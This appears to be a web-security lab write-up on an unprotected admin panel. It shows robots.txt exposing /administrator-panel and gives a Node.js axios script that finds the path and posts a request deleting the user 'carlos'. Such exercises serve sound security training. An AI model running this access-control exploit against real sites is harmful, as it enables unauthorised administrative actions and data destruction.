# 1 - Unprotected Admin

This lab has an unprotected admin panel. Solve the lab by deleting the user `carlos`.

### Notes

The application's `robots.txt` reveals the location of an admin panel that is not properly secured:

```
User-agent: *
Disallow: /administrator-panel
```

From here, we can simply navigate to the panel and delete `carlos`.

### Scripted Solution

```javascript
const axios = require('axios').default
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL

  // Get admin panel URI
  const robotsTxtRes = await axios.get(`${labUrl}/robots.txt`)
  // Get second-to-last line of response body
  let adminUri = robotsTxtRes.data.split(/\r?\n/)
  adminUri = adminUri[adminUri.length - 2]
  // Get last word of last line
  adminUri = adminUri.split(' ')
  adminUri = adminUri[adminUri.length - 1]

  // Delete 'carlos'
  await axios.post(`${labUrl}${adminUri}/delete`, 'username=carlos')
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })

```
